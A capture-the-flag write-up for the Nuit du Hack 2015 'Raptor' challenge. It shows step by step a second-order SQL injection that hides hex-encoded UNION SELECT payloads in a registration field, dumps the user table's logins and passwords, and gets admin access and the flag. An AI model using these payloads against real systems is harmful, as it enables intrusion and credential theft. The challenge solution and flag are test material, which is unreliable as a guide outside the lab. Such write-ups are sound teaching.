# Nuit du Hack Quals CTF 2015: Raptor

**Category:** Misc
**Points:** 400
**Solves:** 19
**Description:** 

> <raptor.challs.nuitduhack.com:4142>

___

## Write-up

Let’s connect to the service :
<br>
```
$ nc raptor.challs.nuitduhack.com 4142
nc: using stream socket
~ » Welcome to the Raptor/1.0 Information Exchange Server
 
~ » You are anonymous - Read only access !
 
Available commands :
+----------+-----------------+-------------------------------+--------------------------------+
| Command | Required Access | Syntax | Help |
+----------+-----------------+-------------------------------+--------------------------------+
| AUTH | guest | AUTH [login] [password] | Connect to an account |
| LIST | user | LIST [maxrecords] | List users informations |
| SEARCH | user | SEARCH [pattern] [maxresults] | Search an user |
| RSHELL | admin | RSHELL | Migrate to Raptor Shell |
| VERSION | guest | VERSION | Show current Raptor version |
| REGISTER | guest | REGISTER | Register a new account |
| HELP | guest | VERSION | Show this help menu |
| RIGHTS | guest | RIGHTS | Print your current rights |
| HISTORY | user | HISTORY | Show your call history |
| RESET | guest | RESET | ROLLBACK ! (Reset the CTF DB.) |
| QUIT | guest | QUIT | Close the connection. |
+----------+-----------------+-------------------------------+--------------------------------+
 
guest ~ $
```
<br>

- After some tests, Notfound found (*tadam tss*) that the phone field can be used to inject hexa code when you register a new user :

```
Login : po
Firstname : po
Lastname : po
Contact (DESK PHONE) : 0x4141
Password : po
Encrypting using 128x(ROT13) ......HAAAAAAAAX......
Password encryption done ! (Security First) !
guest ~ $ AUTH po po
Welcome po !
po ~ $ LIST
 
+-----------------------+-----------------------+-----------+--------+
|       FIRSTNAME       |        LASTNAME       | DESKPHONE | RIGHTS |
+-----------------------+-----------------------+-----------+--------+
|          Yvan         |        Delacam        |    0452   |  user  |
|           ok          |           ok          |    213    |  user  |
|         Wesley        |       Eshmaggle       |    4412   | admin  |
|         Wesley        |       Eshmaggle       |    4412   |  user  |
| ().__class__.__base__ | ().__class__.__base__ |     5     |  user  |
|         Zlatan        |     Ibrahimovitch     |    5122   |  user  |
|          Yvon         |         Payrir        |     A     |  user  |
|           lm          |           lm          |     A     |  user  |
|           po          |           po          |     AA    |  user  |
+-----------------------+-----------------------+-----------+--------+
```
<br>
- After that, when you log as the « po » user and type the « HISTORY » command, the injection happened. So (after many tests…) let’s try to get all the tables !

Using python :

`python 
>>> "1 UNION select table_schema,table_name,null,null FROM information_Schema.tables".encode('hex')
'3120554e494f4e2073656c656374207461626c655f736368656d612c7461626c655f6e616d652c6e756c6c2c6e75'
`
<br>
```
Login : i
Firstname : i
Lastname : i
Contact (DESK PHONE) : 0x3120554e494f4e2073656c656374207461626c655f736368656d612c7461626c655f6e616d652c6e756c6c2c6e756c6c2046524f4d20696e666f726d6174696f6e5f536368656d612e7461626c6573
Password : i
Encrypting using 128x(ROT13) ......HAAAAAAAAX......
Password encryption done ! (Security First) !
guest ~ $ AUTH i i
Welcome i !
i ~ $ HISTORY
 
RAPTOR CALL REPORTING
 
- CLIENT INFO :
 
+-----------+---------------------------------------------------------------------------------+
|  USERNAME |                                        i                                        |
|   RIGHTS  |                                       user                                      |
| DESKPHONE | 1 UNION select table_schema,table_name,null,null FROM information_Schema.tables |
+-----------+---------------------------------------------------------------------------------+
 
 - CALL HISTORY
 
+--------------------+---------------------------------------+-------------+----------+
|         ID         |                  DATE                 | DESTINATION | DURATION |
+--------------------+---------------------------------------+-------------+----------+
| information_schema |             CHARACTER_SETS            |     None    |   None   |
| information_schema |               COLLATIONS              |     None    |   None   |
| information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |     None    |   None   |
| information_schema |                COLUMNS                |     None    |   None   |
| information_schema |           COLUMN_PRIVILEGES           |     None    |   None   |
| information_schema |                ENGINES                |     None    |   None   |
| information_schema |                 EVENTS                |     None    |   None   |
| information_schema |                 FILES                 |     None    |   None   |
| information_schema |             GLOBAL_STATUS             |     None    |   None   |
| information_schema |            GLOBAL_VARIABLES           |     None    |   None   |
| information_schema |            KEY_COLUMN_USAGE           |     None    |   None   |
| information_schema |               PARAMETERS              |     None    |   None   |
| information_schema |               PARTITIONS              |     None    |   None   |
| information_schema |                PLUGINS                |     None    |   None   |
| information_schema |              PROCESSLIST              |     None    |   None   |
| information_schema |               PROFILING               |     None    |   None   |
| information_schema |        REFERENTIAL_CONSTRAINTS        |     None    |   None   |
| information_schema |                ROUTINES               |     None    |   None   |
| information_schema |                SCHEMATA               |     None    |   None   |
| information_schema |           SCHEMA_PRIVILEGES           |     None    |   None   |
| information_schema |             SESSION_STATUS            |     None    |   None   |
| information_schema |           SESSION_VARIABLES           |     None    |   None   |
| information_schema |               STATISTICS              |     None    |   None   |
| information_schema |                 TABLES                |     None    |   None   |
| information_schema |              TABLESPACES              |     None    |   None   |
| information_schema |           TABLE_CONSTRAINTS           |     None    |   None   |
| information_schema |            TABLE_PRIVILEGES           |     None    |   None   |
| information_schema |                TRIGGERS               |     None    |   None   |
| information_schema |            USER_PRIVILEGES            |     None    |   None   |
| information_schema |                 VIEWS                 |     None    |   None   |
| information_schema |           INNODB_BUFFER_PAGE          |     None    |   None   |
| information_schema |               INNODB_TRX              |     None    |   None   |
| information_schema |        INNODB_BUFFER_POOL_STATS       |     None    |   None   |
| information_schema |           INNODB_LOCK_WAITS           |     None    |   None   |
| information_schema |             INNODB_CMPMEM             |     None    |   None   |
| information_schema |               INNODB_CMP              |     None    |   None   |
| information_schema |              INNODB_LOCKS             |     None    |   None   |
| information_schema |          INNODB_CMPMEM_RESET          |     None    |   None   |
| information_schema |            INNODB_CMP_RESET           |     None    |   None   |
| information_schema |         INNODB_BUFFER_PAGE_LRU        |     None    |   None   |
|    x_7822021020    |               call_logs               |     None    |   None   |
|    x_7822021020    |                 users                 |     None    |   None   |
+--------------------+---------------------------------------+-------------+----------+
```
<br>

Time to get what we need : <br>login and password of the « admin » user, to run the RSHELL.

```
Login : n
Firstname : n
Lastname : n
Contact (DESK PHONE) : 0x3120554e494f4e2053454c454354206c6f67696e2c70617373776f72642c7269676874732c66697273746e616d652046524f4d207573657273
Password : n
Encrypting using 128x(ROT13) ......HAAAAAAAAX......
Password encryption done ! (Security First) !
guest ~ $ AUTH n n
Welcome n !
n ~ $ HISTORY

RAPTOR CALL REPORTING
 
- CLIENT INFO :

+-----------+-----------------------------------------------------------+
|  USERNAME |                             n                             |
|   RIGHTS  |                            user                           |
| DESKPHONE | 1 UNION SELECT login,password,rights,firstname FROM users |
+-----------+-----------------------------------------------------------+

- CALL HISTORY

+-----------------+-------------------------------------+-------------+----------+
|        ID       |                 DATE                | DESTINATION | DURATION |
+-----------------+-------------------------------------+-------------+----------+
| z.ibrahimovitch |          WhaledoneWhalecome         |     user    |  Zlatan  |
|    y.delacam    |         BrainBrainBrainBrain        |     user    |   Yvan   |
|     y.payrir    | bordel.quand.on.rentre.sur.la.piste |     user    |   Yvon   |
|   w.eshmaggle   |              Hanlbatard             |    admin    |  Wesley  |
|        l        |                  l                  |     user    |    l     |
|        m        |                  m                  |     user    |    m     |
|        n        |                  n                  |     user    |    n     |
+-----------------+-------------------------------------+-------------+----------+
```
<br><br>

- And now, we can use the admin login/password to log and run the RSHELL command :

```bash
guest ~ $ AUTH w.eshmaggle Hanlbatard
Welcome w.eshmaggle !

w.eshmaggle ~ $ RSHELL
Ok, ok good job. You are admin... The flag is : 0eb80d9c2cdee95b461cf0b70d40791f

w.eshmaggle ~ $
```
<br>

Done, and thx [Thxer](https://twitter.com/Thxer_) and RageYL

— [Elkaluche](https://twitter.com/Elkaluche)
